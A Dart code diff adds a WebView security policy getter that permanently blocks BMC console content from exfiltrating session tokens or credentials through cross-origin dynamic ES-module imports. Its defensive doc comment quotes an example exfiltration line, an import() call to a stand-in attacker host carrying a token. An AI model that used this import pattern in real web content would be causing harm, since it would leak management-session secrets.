@@ -2041,6 +2041,50 @@ class KvmWebViewPolicy {
   /// `WEBVIEW_TLS_MATRIX.md` (RP-1).
   bool get bypassSpeechSynthesisExfiltration => false;
 
+  /// Always `false`: dynamic `import()` / cross-origin ES-module import
+  /// exfiltration is NEVER available to attacker-influenced console content,
+  /// not even by the test-only self-signed opt-in.
+  ///
+  /// The embedded WebView must not let remote BMC console content use the ES
+  /// module dynamic `import()` operator to load a module whose URL carries
+  /// privileged management-session data — KVM frame handles, session tokens,
+  /// operator credentials or managed-host inventory — from a non-approved
+  /// origin: no `import('https://attacker.example/mod.js?token=...')`, no
+  /// `import()` of a `blob:` / `data:` module assembled from console DOM, and no
+  /// module-graph `import` chain that reaches a non-approved origin. A dynamic
+  /// module load is a distinct main-thread script-loading channel governed by
+  /// the CSP `script-src` directive: it is not programmatic `connect-src`
+  /// egress (fetch / XHR / WebSocket / sendBeacon) and not `worker-src` Worker /
+  /// `importScripts` loading, so a `connect-src 'self'` allowlist alone does not
+  /// confine it. Console content is served by the BMC and is therefore
+  /// attacker-influenced: a compromised/spoofed BMC or injected script must
+  /// never turn the trusted frame into a cross-origin ES-module import
+  /// exfiltration channel. Every cross-origin dynamic module import from
+  /// console content must be denied at the WebView (module loads pinned to the
+  /// approved same-origin HTTPS console via `script-src`, requests denied at
+  /// interception) on every target, in strict mode and with the flag both off
+  /// and on.
+  ///
+  /// This is a hard, configuration-independent invariant, so a future WebView
+  /// consumer can consult it and can never obtain a policy that lets console
+  /// content dynamically import a cross-origin ES module. Tolerating the test
+  /// BMC's untrusted server leaf relaxes ONLY that leaf's trust for the
+  /// expected host, via a scoped per-connection verifier; it must never grant a
+  /// dynamic module import just to make a console render or to debug it.
+  /// Operator/app-initiated loads of the console's own approved-origin modules
+  /// are a separate functional path and stay unaffected. It governs the
+  /// main-thread programmatic ES-module loading channel, so it is distinct
+  /// from worker-script exfiltration ([bypassWorkerScriptExfiltration]) (an
+  /// off-main-thread Worker / `importScripts` load governed by `worker-src`),
+  /// from HTML-driven `<script src>` markup beacons
+  /// ([bypassHtmlSubresourceExfiltration]) (a document-element script source),
+  /// from CSS-driven subresource exfiltration ([bypassCssExfiltration]) and from
+  /// programmatic outbound egress ([bypassOutboundEgressAllowlist]) (fetch /
+  /// XHR / WebSocket / sendBeacon governed by `connect-src`): those govern
+  /// other script, markup or request surfaces, not dynamic ES-module imports.
+  /// See `WEBVIEW_TLS_MATRIX.md` (RP-1).
+  bool get bypassDynamicModuleImportExfiltration => false;
+
   /// Whether an in-app WebView may render this console.
   ///
   /// In-app rendering requires the opt-in flag AND an enabled, HTML5 console
